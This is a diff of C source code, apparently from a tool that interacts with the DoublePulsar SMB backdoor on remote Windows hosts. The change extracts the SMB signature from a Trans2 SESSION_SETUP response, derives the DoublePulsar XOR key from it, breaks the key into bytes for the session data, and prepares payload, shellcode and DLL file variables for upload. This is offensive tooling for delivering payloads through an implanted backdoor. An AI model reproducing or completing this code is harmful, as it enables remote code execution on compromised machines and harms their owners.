@@ -351,60 +351,43 @@ int main(int argc, char* argv[])
 	memcpy(trans2_request + 30, (char*)&processid, 2);
 	memcpy(trans2_request + 32, (char*)&userid, 2);
 	//memcpy(trans2_request + 34, (char*)&multiplexid, 2);
-	trans2_request[34] = '\x41'; //update Multiplex ID to 41
+	//trans2_request[34] = '\x41'; //update Multiplex ID to 41
 	//if DoublePulsar is enabled, the multiplex ID is incremented by 10
 	//will return x51 or 81
 	send(sock, (char*)trans2_request, sizeof(trans2_request) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
-	//Not Done!  Fix me!
-	//extract SMB Signature Key from the Trans2 SESSION_SETUP Response
-	unsigned int smb_signature[8];
-	//OR
-	//memcpy(signature, (unsigned int*)&recvbuff + 18, 8);
-	memcpy(smb_signature, (unsigned int*)&recvbuff + 18, 2);
-	memcpy(smb_signature + 2, (unsigned int*)&recvbuff + 20, 2);
-	memcpy(smb_signature + 4, (unsigned int*)&recvbuff + 22, 2);
-	memcpy(smb_signature + 6, (unsigned int*)&recvbuff + 24, 2);
 	
-	/* untested 
-	unsigned int smb_signature[3];
-	memcpy(smb_signature, (unsigned int*)&recvbuff + 18, 1);
-	memcpy(smb_signature + 1, (unsigned int*)&recvbuff + 19, 1);
-	memcpy(smb_signature + 2, (unsigned int*)&recvbuff + 20, 1);
-	memcpy(smb_signature + 3, (unsigned int*)&recvbuff + 21, 1);
-	//get Architecture of remote computer via Doublepulsar response
-	BOOL is64bit;
-	if(recvbuff[22] = 1)
-	{
-		is64bit = TRUE;
-		printf("Arch is 64 bit!\n");
-	}
-	*/
-	
-	//Example SMB signature
-	//Steal from SMB trans2 response [18][19][20][21][22]
-	unsigned char signature[] = "\x6f\x0a\x2d\x8d\x01";
+	unsigned char signature[5];
 	unsigned int sig;
+	//copy SMB signature from recvbuff to local buffer
+	signature[0] = recvbuff[18];
+	signature[1] = recvbuff[19];
+	signature[2] = recvbuff[20];
+	signature[3] = recvbuff[21];
+	signature[4] = recvbuff[22];
 	
-	//convert the SMB Trans2 signature response to an unsigned integer
-	memcpy(&sig, (unsigned int)&signature, sizeof(unsigned int));
-	
-	//Calculate the doublepulsar XOR key from the SMB trans2 response signature
-	//This XOR key will be used to encrypt the payload buffer
-	unsigned int XorKey = ComputeDOUBLEPULSARXorKey(sig);
-	printf("Calculated XOR KEY:  0x%x", XorKey);
-	
-	/*
-	From Python source code
-	signature = recvbuff[18:26]
-        signature_long = struct.unpack('<Q', signature)[0]
-        key = calculate_doublepulsar_xor_key(signature_long)
-        arch = calculate_doublepulsar_arch(signature_long)
-	
-	Q = (C) unsigned long long.  Standard size = 8
-	*/
+	//convert the signature buffer to unsigned integer 
+	memcpy((unsigned int*)&sig, (unsigned int*)&signature, sizeof(unsigned int));
 
+	//calculate the XOR key for DoublePulsar
+	unsigned int XorKey = ComputeDOUBLEPULSARXorKey(sig);
+	printf("Calculated XOR KEY:  0x%x\n", XorKey);
+	
+	//will use for re-sending the computed XOR key in the Trans2 SESSION_SETUP data parameters
+	unsigned char c[4];
+
+	c[0] = XorKey & 0xFF;
+	c[1] = (XorKey >> 8) & 0xFF;
+	c[2] = (XorKey >> 8 >> 8) & 0xFF;
+	c[3] = (XorKey >> 8 >> 8 >> 8) & 0xFF;
+
+	printf("XOR Key in characters ( needed for DoublePulsar SESSION Data ):\n");
+	printf("c[0] = %x \n", c[0]);
+	printf("c[1] = %x \n", c[1]);
+	printf("c[2] = %x \n", c[2]);
+	printf("c[3] = %x \n", c[3]);
+	
 	BUFFER_WITH_SIZE payload;
 	LPCSTR shellcode_file;
 	LPCSTR dll_file;
